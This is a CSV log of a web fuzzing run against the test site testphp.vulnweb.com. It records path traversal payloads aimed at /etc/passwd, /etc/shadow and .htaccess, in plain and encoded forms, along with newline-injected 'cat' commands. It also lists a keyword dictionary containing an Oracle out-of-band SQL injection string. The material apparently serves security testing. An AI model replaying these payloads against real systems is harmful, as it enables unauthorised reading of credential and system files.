id_fuzz_1,46,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,47,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,48,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,49,,http://testphp.vulnweb.com/listproducts.php?cat=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,50,,http://testphp.vulnweb.com/listproducts.php?cat=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,51,,http://testphp.vulnweb.com/listproducts.php?cat=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,52,,http://testphp.vulnweb.com/listproducts.php?cat=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,53,,http://testphp.vulnweb.com/listproducts.php?cat=../../../.htaccess,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 1, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,54,,http://testphp.vulnweb.com/listproducts.php?cat=../../.htaccess,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 1, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,55,,http://testphp.vulnweb.com/listproducts.php?cat=../.htaccess,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 1, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,56,,http://testphp.vulnweb.com/listproducts.php?cat=.htaccess,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 1, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,57,,http://testphp.vulnweb.com/listproducts.php?cat=././.htaccess,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 1, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,58,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 1, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,59,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 1, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,60,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2e%2f%2e%68%74%61%63%63%65%73%73,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 1, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,61,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%68%74%61%63%63%65%73%73,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 1, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,62,,http://testphp.vulnweb.com/listproducts.php?cat=%2e%2f%2e%2f%2e%68%74%61%63%63%65%73%73,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 1, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,63,,http://testphp.vulnweb.com/listproducts.php?cat=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,64,,http://testphp.vulnweb.com/listproducts.php?cat=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,65,,http://testphp.vulnweb.com/listproducts.php?cat=%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,66,,http://testphp.vulnweb.com/listproducts.php?cat=%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,67,,http://testphp.vulnweb.com/listproducts.php?cat=%%32%65%%32%66%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,68,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../../../../../etc/hosts%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,69,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../../../../../etc/hosts,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,70,,http://testphp.vulnweb.com/listproducts.php?cat=../../boot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,71,,http://testphp.vulnweb.com/listproducts.php?cat=/../../../../../../../../%2A,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,72,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../../../../../etc/passwd%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,73,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../../../../../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,74,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../../../../../etc/shadow%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,75,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../../../../../etc/shadow,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,76,,http://testphp.vulnweb.com/listproducts.php?cat=/../../../../../../../../../../etc/passwd^^,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,77,,http://testphp.vulnweb.com/listproducts.php?cat=/../../../../../../../../../../etc/shadow^^,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,78,,http://testphp.vulnweb.com/listproducts.php?cat=/../../../../../../../../../../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,79,,http://testphp.vulnweb.com/listproducts.php?cat=/../../../../../../../../../../etc/shadow,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,80,,http://testphp.vulnweb.com/listproducts.php?cat=/./././././././././././etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,81,,http://testphp.vulnweb.com/listproducts.php?cat=/./././././././././././etc/shadow,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,82,,http://testphp.vulnweb.com/listproducts.php?cat=\..\..\..\..\..\..\..\..\..\..\etc\passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,83,,http://testphp.vulnweb.com/listproducts.php?cat=\..\..\..\..\..\..\..\..\..\..\etc\shadow,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,84,,http://testphp.vulnweb.com/listproducts.php?cat=..\..\..\..\..\..\..\..\..\..\etc\passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,85,,http://testphp.vulnweb.com/listproducts.php?cat=..\..\..\..\..\..\..\..\..\..\etc\shadow,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,86,,http://testphp.vulnweb.com/listproducts.php?cat=/..\../..\../..\../..\../..\../..\../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,87,,http://testphp.vulnweb.com/listproducts.php?cat=/..\../..\../..\../..\../..\../..\../etc/shadow,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,88,,http://testphp.vulnweb.com/listproducts.php?cat=.\./.\./.\./.\./.\./.\./etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,89,,http://testphp.vulnweb.com/listproducts.php?cat=.\./.\./.\./.\./.\./.\./etc/shadow,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,90,,http://testphp.vulnweb.com/listproducts.php?cat=\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,91,,http://testphp.vulnweb.com/listproducts.php?cat=\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,92,,http://testphp.vulnweb.com/listproducts.php?cat=..\..\..\..\..\..\..\..\..\..\etc\passwd%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,93,,http://testphp.vulnweb.com/listproducts.php?cat=..\..\..\..\..\..\..\..\..\..\etc\shadow%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,94,,http://testphp.vulnweb.com/listproducts.php?cat=%0a/bin/cat%20/etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,95,,http://testphp.vulnweb.com/listproducts.php?cat=%0a/bin/cat%20/etc/shadow,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
